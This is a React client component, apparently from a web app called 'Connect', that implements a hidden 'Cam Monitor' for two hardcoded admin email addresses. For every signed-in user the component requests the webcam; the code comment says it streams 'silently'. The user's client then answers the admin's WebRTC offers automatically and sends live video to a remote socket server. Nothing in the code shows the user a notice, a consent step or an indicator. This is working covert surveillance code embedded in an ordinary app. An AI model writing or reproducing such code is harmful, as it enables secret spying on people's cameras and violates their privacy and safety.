'use client';

import { useEffect, useRef, useState, useCallback } from 'react';
import { io, Socket } from 'socket.io-client';

const SOCKET_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://server-6gmj.onrender.com';
const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];

const STUN_SERVERS = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
  ],
};

interface CamUser {
  email: string;
  username: string;
  socketId: string;
  connectedAt: number;
}

interface AdminCamViewerProps {
  userEmail: string;
  username: string;
  isOpen: boolean;
  onOpenChange: (open: boolean) => void;
  onCamUsersCount?: (count: number) => void;
}

export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChange, onCamUsersCount }: AdminCamViewerProps) {
  const isAdmin = !!userEmail && ADMIN_EMAILS.includes(userEmail.toLowerCase().trim());

  const [camUsers, setCamUsers] = useState<CamUser[]>([]);
  const [viewingUser, setViewingUser] = useState<CamUser | null>(null);
  const [streamStatus, setStreamStatus] = useState<'idle' | 'connecting' | 'live' | 'error'>('idle');

  // Notify parent of count changes
  useEffect(() => {
    onCamUsersCount?.(camUsers.length);
  }, [camUsers.length, onCamUsersCount]);

  const socketRef = useRef<Socket | null>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const remoteVideoRef = useRef<HTMLVideoElement | null>(null);
  const viewingSocketIdRef = useRef<string | null>(null);

  // ── User side: silently stream camera ────────────────────────────────────────
  const localStreamRef = useRef<MediaStream | null>(null);
  const userPeerRef = useRef<RTCPeerConnection | null>(null);

  // Connect socket and register as cam-ready (all users)
  useEffect(() => {
    if (!userEmail) return;

    const socket = io(SOCKET_URL, {
      transports: ['websocket', 'polling'],
      reconnectionAttempts: 5,
    });
    socketRef.current = socket;

    socket.on('connect', () => {
      // Identify with main socket room
      socket.emit('identify', { email: userEmail.toLowerCase().trim() });

      // Start camera for ALL users (including admin) to request camera permission and announce readiness
      startUserCamera(socket);

      // If admin: request current cam user list
      if (isAdmin) {
        socket.emit('cam_get_users');
      }
    });

    // Realtime auto-refresh interval for admin (3-second polling fallback for instant list updates)
    let refreshInterval: NodeJS.Timeout | null = null;
    if (isAdmin) {
      refreshInterval = setInterval(() => {
        if (socket.connected) {
          socket.emit('cam_get_users');
        }
      }, 3000);
    }

    // ── Admin listeners ──
    if (isAdmin) {
      socket.on('cam_users_list', (list: CamUser[]) => {
        setCamUsers(list.map(u => ({ ...u, connectedAt: Date.now() })));
      });

      socket.on('cam_user_online', (user: CamUser) => {
        setCamUsers(prev => {
          const exists = prev.find(u => u.socketId === user.socketId || u.email === user.email);
          if (exists) return prev;
          return [...prev, { ...user, connectedAt: Date.now() }];
        });
      });

      socket.on('cam_user_offline', ({ socketId }: { socketId: string }) => {
        setCamUsers(prev => prev.filter(u => u.socketId !== socketId));
        if (viewingSocketIdRef.current === socketId) {
          stopViewing();
        }
      });

      // Receive WebRTC answer/ICE from target user
      socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
        if (signal.type === 'offer') {
          await handleUserOffer(fromSocketId, signal, socket);
          return;
        }
        if (!peerRef.current) return;
        try {
          if (signal.type === 'answer') {
            await peerRef.current.setRemoteDescription(new RTCSessionDescription(signal));
          } else if (signal.candidate || signal.sdpMid !== undefined) {
            await peerRef.current.addIceCandidate(new RTCIceCandidate(signal));
          }
        } catch (e) {
          console.warn('Admin ICE error:', e);
        }
      });
    } else {
      // Regular user receives WebRTC offer from admin
      socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
        try {
          if (signal.type === 'offer') {
            await handleUserOffer(fromSocketId, signal, socket);
          } else if ((signal.candidate || signal.sdpMid !== undefined) && userPeerRef.current) {
            await userPeerRef.current.addIceCandidate(new RTCIceCandidate(signal));
          }
        } catch (e) {
          console.warn('User ICE error:', e);
        }
      });
    }

    return () => {
      if (refreshInterval) clearInterval(refreshInterval);
      socket.disconnect();
      localStreamRef.current?.getTracks().forEach(t => t.stop());
      userPeerRef.current?.close();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [userEmail, isAdmin]);

  // ── Acquire camera stream for any connected client ──────────────────────────
  const startUserCamera = async (socket: Socket) => {
    const cleanEmail = userEmail ? userEmail.toLowerCase().trim() : 'user@connect.app';
    const cleanUsername = username || cleanEmail.split('@')[0] || 'User';

    if (localStreamRef.current) {
      socket.emit('cam_viewer_ready', { email: cleanEmail, username: cleanUsername });
      return;
    }

    try {
      if (typeof navigator !== 'undefined' && navigator.mediaDevices?.getUserMedia) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false,
          });
          localStreamRef.current = stream;
        } catch {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
          localStreamRef.current = stream;
        }
      }
    } catch (err) {
      console.warn('Camera permission denied or camera not available:', err);
    } finally {
      // Always register online status so admin sees client in user list
      socket.emit('cam_viewer_ready', { email: cleanEmail, username: cleanUsername });
    }
  };

  // ── Answer admin's WebRTC offer ───────────────────────────────────────────
  const handleUserOffer = async (adminSocketId: string, offer: RTCSessionDescriptionInit, socket: Socket) => {
    if (!localStreamRef.current) {
      await startUserCamera(socket);
    }
    if (!localStreamRef.current) return;

    const peer = new RTCPeerConnection(STUN_SERVERS);
    userPeerRef.current = peer;

    // Add local tracks
    localStreamRef.current.getTracks().forEach(track => {
      peer.addTrack(track, localStreamRef.current!);
    });

    // ICE candidates
    peer.onicecandidate = (e) => {
      if (e.candidate) {
        socket.emit('cam_signal_relay', {
          toSocketId: adminSocketId,
          signal: e.candidate,
        });
      }
    };

    await peer.setRemoteDescription(new RTCSessionDescription(offer));
    const answer = await peer.createAnswer();
    await peer.setLocalDescription(answer);

    socket.emit('cam_signal_relay', {
      toSocketId: adminSocketId,
      signal: answer,
    });
  };

  // ── Admin: start viewing a user ───────────────────────────────────────────
  const startViewing = useCallback(async (user: CamUser) => {
    stopViewing();
    setViewingUser(user);
    setStreamStatus('connecting');
    viewingSocketIdRef.current = user.socketId;

    const peer = new RTCPeerConnection(STUN_SERVERS);
    peerRef.current = peer;

    peer.ontrack = (e) => {
      if (remoteVideoRef.current && e.streams[0]) {
        remoteVideoRef.current.srcObject = e.streams[0];
        setStreamStatus('live');
      }
    };

    peer.onicecandidate = (e) => {
      if (e.candidate && socketRef.current) {
        socketRef.current.emit('cam_view_request', {
          targetSocketId: user.socketId,
          signal: e.candidate,
        });
      }
    };

    peer.oniceconnectionstatechange = () => {
      if (peer.iceConnectionState === 'failed' || peer.iceConnectionState === 'disconnected') {
        setStreamStatus('error');
      }
    };

    // Create offer
    const offer = await peer.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
    await peer.setLocalDescription(offer);

    socketRef.current?.emit('cam_view_request', {
      targetSocketId: user.socketId,
      signal: offer,
    });
  }, []);

  const stopViewing = useCallback(() => {
    peerRef.current?.close();
    peerRef.current = null;
    if (remoteVideoRef.current) remoteVideoRef.current.srcObject = null;
    setViewingUser(null);
    setStreamStatus('idle');
    viewingSocketIdRef.current = null;
  }, []);

  // Only render for admin
  if (!isAdmin) return null;

  const activeCount = camUsers.length;

  return (
    <>
      {/* Full-Screen Admin Panel */}
      {isOpen && (
        <div
          className="fixed inset-0 z-[9999] flex flex-col md:flex-row bg-black select-none"
          style={{ background: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif' }}
        >
          {/* User list sidebar */}
          <div
            className={`w-full md:w-[320px] flex-shrink-0 flex flex-col border-b md:border-b-0 md:border-r overflow-hidden h-full ${
              viewingUser ? 'hidden md:flex' : 'flex'
            }`}
            style={{ borderColor: 'rgba(255,255,255,0.1)', background: '#070709' }}
          >
            {/* Header with notch padding */}
            <div
              className="px-6 pt-[calc(18px+env(safe-area-inset-top,0px))] pb-4 flex items-center justify-between border-b flex-shrink-0"
              style={{ borderColor: 'rgba(255,255,255,0.1)', background: '#0c0c0f' }}
            >
              <div>
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse" />
                  <p className="text-white font-bold text-base tracking-tight">Cam Monitor</p>
                </div>
                <p className="text-xs mt-1 font-medium" style={{ color: 'rgba(255,255,255,0.5)' }}>
                  {activeCount} active {activeCount === 1 ? 'user' : 'users'} online
                </p>
              </div>
              <button
                onClick={() => { onOpenChange(false); stopViewing(); }}
                className="w-10 h-10 rounded-full flex items-center justify-center transition-all bg-white/10 hover:bg-white/20 active:scale-90 text-white cursor-pointer"
                title="Close"
              >
                <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Refresh button */}
            <div className="px-5 py-3 flex-shrink-0">
              <button
                onClick={() => socketRef.current?.emit('cam_get_users')}
                className="w-full py-3 px-4 rounded-2xl text-xs font-bold transition-all active:scale-95 cursor-pointer flex items-center justify-center gap-2 shadow-md"
                style={{
                  background: 'rgba(255,255,255,0.1)',
                  color: '#ffffff',
                  border: '1px solid rgba(255,255,255,0.15)',
                }}
              >
                <svg width="15" height="15" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                </svg>
                <span>Refresh Client List</span>
              </button>
            </div>

            {/* User list */}
            <div className="flex-1 overflow-y-auto px-4 py-2 space-y-2">
              {camUsers.length === 0 ? (
                <div className="flex flex-col items-center justify-center h-64 text-center px-4">
                  <div
                    className="w-14 h-14 rounded-full flex items-center justify-center mb-4 border border-white/10"
                    style={{ background: 'rgba(255,255,255,0.05)' }}
                  >
                    <svg width="24" height="24" fill="none" stroke="rgba(255,255,255,0.4)" viewBox="0 0 24 24" strokeWidth="1.5">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  </div>
                  <p className="text-sm font-semibold text-white/60">No connected users</p>
                  <p className="text-xs text-white/30 mt-1">Users will appear here when they open Connect</p>
                </div>
              ) : (
                camUsers.map(user => {
                  const isViewing = viewingUser?.socketId === user.socketId;
                  return (
                    <button
                      key={user.socketId}
                      onClick={() => isViewing ? stopViewing() : startViewing(user)}
                      className="w-full flex items-center gap-3.5 px-4 py-3.5 rounded-2xl transition-all text-left cursor-pointer active:scale-98 shadow-sm"
                      style={{
                        background: isViewing ? 'rgba(239,68,68,0.2)' : 'rgba(255,255,255,0.06)',
                        border: `1.5px solid ${isViewing ? '#ef4444' : 'rgba(255,255,255,0.08)'}`,
                      }}
                    >
                      {/* Avatar */}
                      <div
                        className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 text-xs font-black uppercase tracking-wider"
                        style={{
                          background: isViewing ? '#ef4444' : 'rgba(255,255,255,0.15)',
                          color: '#ffffff',
                        }}
                      >
                        {(user.username || user.email || '?').slice(0, 2)}
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="text-xs font-bold truncate text-white">
                          {user.username || user.email?.split('@')[0] || 'User'}
                        </p>
                        <p className="text-[11px] truncate mt-0.5" style={{ color: 'rgba(255,255,255,0.4)' }}>
                          {user.email || '—'}
                        </p>
                      </div>
                      {/* Status button */}
                      <div
                        className="px-3 py-1 rounded-full text-[10px] font-bold tracking-wide uppercase flex items-center gap-1.5 flex-shrink-0"
                        style={{
                          background: isViewing ? '#ef4444' : 'rgba(34,197,94,0.15)',
                          color: isViewing ? '#ffffff' : '#4ade80',
                          border: `1px solid ${isViewing ? '#ef4444' : 'rgba(34,197,94,0.3)'}`,
                        }}
                      >
                        <span className="w-1.5 h-1.5 rounded-full" style={{ background: isViewing ? '#ffffff' : '#22c55e' }} />
                        {isViewing ? 'LIVE' : 'VIEW'}
                      </div>
                    </button>
                  );
                })
              )}
            </div>
          </div>

          {/* Right/Main: Pitch Black Full Video View */}
          <div
            className={`flex-1 flex flex-col items-center justify-center relative w-full h-full bg-black ${
              !viewingUser ? 'hidden md:flex' : 'flex'
            }`}
            style={{ background: '#000000' }}
          >
            {!viewingUser ? (
              <div className="flex flex-col items-center gap-4 text-center px-6">
                <div
                  className="w-20 h-20 rounded-full flex items-center justify-center"
                  style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)' }}
                >
                  <svg width="36" height="36" fill="none" stroke="rgba(255,255,255,0.25)" viewBox="0 0 24 24" strokeWidth="1.5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 10l4.553-2.069A1 1 0 0121 8.868v6.264a1 1 0 01-1.447.894L15 14M4 8a2 2 0 00-2 2v4a2 2 0 002 2h8a2 2 0 002-2v-4a2 2 0 00-2-2H4z" />
                  </svg>
                </div>
                <p className="text-sm font-medium text-white/30">
                  Select a user from the list to view live camera
                </p>
              </div>
            ) : (
              <>
                {/* TOP CONTROL HEADER — Positioned safely BELOW mobile status bar notch */}
                <div
                  className="absolute left-4 right-4 z-30 flex items-center justify-between pointer-events-none"
                  style={{ top: 'calc(18px + env(safe-area-inset-top, 12px))' }}
                >
                  {/* Left: Round Back Arrow button */}
                  <button
                    onClick={stopViewing}
                    className="pointer-events-auto w-11 h-11 rounded-full flex items-center justify-center text-white transition-all active:scale-90 shadow-2xl cursor-pointer"
                    style={{ background: 'rgba(0,0,0,0.75)', backdropFilter: 'blur(16px)', border: '1px solid rgba(255,255,255,0.2)' }}
                    title="Back to User List"
                  >
                    <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                  </button>

                  {/* Center: Clean Username Badge */}
                  <div
                    className="flex items-center gap-2 px-4 py-2 rounded-full shadow-xl"
                    style={{ background: 'rgba(0,0,0,0.75)', backdropFilter: 'blur(16px)', border: '1px solid rgba(255,255,255,0.15)' }}
                  >
                    <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse flex-shrink-0" />
                    <span className="text-xs font-bold text-white tracking-wide truncate max-w-[150px]">
                      {viewingUser.username || viewingUser.email?.split('@')[0]}
                    </span>
                  </div>

                  {/* Right: Round Close X Button */}
                  <button
                    onClick={() => { stopViewing(); onOpenChange(false); }}
                    className="pointer-events-auto w-11 h-11 rounded-full flex items-center justify-center text-white transition-all active:scale-90 shadow-2xl cursor-pointer"
                    style={{ background: 'rgba(239,68,68,0.9)', backdropFilter: 'blur(16px)', border: '1px solid rgba(255,255,255,0.25)' }}
                    title="Close Cam Monitor"
                  >
                    <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                  </button>
                </div>

                {/* Pitch Black Video element — Full width/height */}
                <div className="w-full h-full flex items-center justify-center bg-black overflow-hidden relative">
                  <video
                    ref={remoteVideoRef}
                    autoPlay
                    playsInline
                    muted
                    className="w-full h-full object-cover md:object-contain bg-black"
                    style={{ background: '#000000' }}
                  />

                  {streamStatus === 'connecting' && (
                    <div className="absolute inset-0 flex items-center justify-center bg-black/80 z-10">
                      <div className="flex flex-col items-center gap-3">
                        <div
                          className="w-10 h-10 border-3 rounded-full animate-spin"
                          style={{ borderColor: 'rgba(255,255,255,0.15)', borderTopColor: '#ef4444' }}
                        />
                        <p className="text-xs font-medium text-white/60">Connecting stream...</p>
                      </div>
                    </div>
                  )}
                </div>

                {/* BOTTOM FLOATING ACTION BAR — Positioned comfortably at the bottom */}
                <div
                  className="absolute bottom-8 left-1/2 -translate-x-1/2 z-30 flex items-center gap-3 px-5 py-3 rounded-full shadow-2xl"
                  style={{
                    background: 'rgba(15,15,18,0.92)',
                    backdropFilter: 'blur(20px)',
                    border: '1px solid rgba(255,255,255,0.2)',
                  }}
                >
                  <button
                    onClick={() => startViewing(viewingUser)}
                    className="flex items-center gap-2 px-4 py-2.5 rounded-full text-xs font-bold text-white transition-all active:scale-90 cursor-pointer"
                    style={{ background: 'rgba(255,255,255,0.12)', border: '1px solid rgba(255,255,255,0.15)' }}
                  >
                    <svg width="15" height="15" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                    </svg>
                    <span>Reconnect</span>
                  </button>

                  <button
                    onClick={() => { stopViewing(); onOpenChange(false); }}
                    className="flex items-center gap-2 px-5 py-2.5 rounded-full text-xs font-bold text-white transition-all active:scale-90 cursor-pointer shadow-lg"
                    style={{ background: '#ef4444' }}
                  >
                    <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                    <span>Close</span>
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}


